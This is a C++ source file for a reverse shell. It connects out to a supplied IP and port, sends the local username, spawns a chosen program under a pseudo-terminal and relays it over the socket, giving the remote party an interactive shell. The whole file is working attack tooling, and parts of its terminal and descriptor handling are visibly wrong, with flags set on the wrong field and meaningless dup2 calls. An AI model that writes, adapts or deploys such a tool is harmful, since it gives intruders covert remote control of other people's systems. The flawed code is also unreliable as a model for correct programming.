#include <iostream>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pty.h>
#include <cstring>
#include <cstdio>

void reverseShell(const std::string& ip, int port, const std::string& exe_path) {
    // Create a TCP socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    // Create a sockaddr_in struct
    struct sockaddr_in addr {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    // Continuously try to connect to the target
    while (true) {
        // Connect to the target
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
            printf("[-] Failed to connect to %s:%d\n", ip.c_str(), port);
            sleep(1);
            continue;
        }
        break;
    }
    printf("[+] Connected to %s:%d\n", ip.c_str(), port);

    // Send a message to the target using
    char buf[1024];
    sprintf(buf, "[+] Spawned %s for user: %s\n", exe_path.c_str(), getenv("USER"));
    send(sock, buf, strlen(buf), 0);

    // Get socket fileno
    int fd = 0;
    ioctl(sock, TIOCSPGRP, &fd);

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    // Fork PTY
    int master = 0;
    pid_t pid = forkpty(&master, nullptr, nullptr, nullptr);

    if (pid == 0) {
        setsid();
        execl(exe_path.c_str(), exe_path.c_str(), nullptr);
    }

    // Try to set the PTY to raw mode
    struct termios mode {};
    tcgetattr(master, &mode);
    mode.c_lflag &= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);
    mode.c_lflag &= ~(OPOST);
    mode.c_lflag &= ~(CSIZE | PARENB);
    mode.c_lflag |= (CS8);
    mode.c_lflag &= ~(ECHO | ICANON | IEXTEN | ISIG);
    mode.c_cc[VMIN] = 1;
    mode.c_cc[VTIME] = 0;
    tcsetattr(master, TCSAFLUSH, &mode);

    // Continuously bridge the PTY and the socket
    while (true) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(master, &fds);
        FD_SET(sock, &fds);

        int ret = select(master + 1, &fds, nullptr, nullptr, nullptr);
        if (ret == -1) {
            break;
        }

        if (FD_ISSET(master, &fds)) {
            char pty_buffer[1024];
            int n = read(master, pty_buffer, sizeof(pty_buffer));
            if (n <= 0) {
                break;
            }
            send(sock, pty_buffer, n, 0);
        }

        if (FD_ISSET(sock, &fds)) {
            char pty_buffer[1024];
            int n = recv(sock, pty_buffer, sizeof(pty_buffer), 0);
            if (n <= 0) {
                break;
            }
            write(master, pty_buffer, n);
        }
    }

    sprintf(buf, "[-] Connection closed\n");
    send(sock, buf, strlen(buf), 0);
    // Close the socket
    close(sock);
    close(master);
}


int main(int argc, char *argv[])
{
    // Parse command line arguments: ip, port and executable path
    // Check for the correct number of arguments
    if (argc != 4)
    {
        printf("Usage: %s <ip> <port> <executable path>\n", argv[0]);
        return 1;
    }

    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    std::string exe_path = argv[3];

    // Check the port number is valid
    if (port < 0 || port > 65535)
    {
        printf("Invalid port number: %d\n", port);
        return 1;
    }

    // Check the executable path is valid and executable
    if (access(exe_path.c_str(), X_OK) != 0)
    {
        printf("Invalid executable path: %s\n", exe_path.c_str());
        return 1;
    }

    // Start the reverse shell
    reverseShell(ip, port, exe_path);

    return 0;
}